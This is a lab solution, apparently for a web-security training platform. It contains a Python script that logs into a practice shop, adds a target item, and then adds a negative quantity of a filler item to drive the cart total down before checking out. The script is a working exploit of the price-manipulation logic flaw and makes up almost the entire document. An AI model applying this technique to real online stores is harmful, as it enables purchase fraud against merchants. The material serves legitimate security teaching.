# High-level logic vulnerability
> This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup

BASE_URL = "https://0a8d00b603bb57e680fe7b7900230006.web-security-academy.net/"

def exploit(url):
    session = requests.Session()
    
    # 1. Login Phase
    login_endpoint = url + "login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_creds = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    response = session.post(login_endpoint, data=login_creds)
    
    if "Log out" in response.text:
        print("[+] LOGIN SUCCESSFUL")
        
        # 2. Add Target Item (Leather Jacket)
        cart_endpoint = url + "cart"
        jacket_payload = {
            "productId": 1,
            "redir": "PRODUCT",
            "quantity": 1
        }
        response = session.post(cart_endpoint, data=jacket_payload)
        
        if response.status_code in [200, 302]:
            print("[+] JACKET ADDED")
            
            # 3. Add Negative Quantity of Filler Item to Reduce Total Price
            filler_payload = {
                "productId": 2,
                "redir": "PRODUCT",
                "quantity": -39
            }
            response = session.post(cart_endpoint, data=filler_payload)
            
            if response.status_code in [200, 302]:
                print("[+] NEGATIVE QUANTITY FILLER ITEMS ADDED")
                
                # 4. Checkout Phase
                response = session.get(cart_endpoint)
                soup = BeautifulSoup(response.text, 'html.parser')
                checkout_csrf = soup.find("input", {"name": "csrf"})['value']
                
                checkout_endpoint = url + "cart/checkout"
                checkout_payload = {
                    "csrf": checkout_csrf
                }
                session.post(checkout_endpoint, data=checkout_payload)
                
                # 5. Verification Phase
                response = session.get(url)
                if "Congratulations" in response.text:
                    print("[+] EXPLOIT SUCCESSFUL: Lab Solved")

if __name__ == "__main__":
    exploit(BASE_URL)
```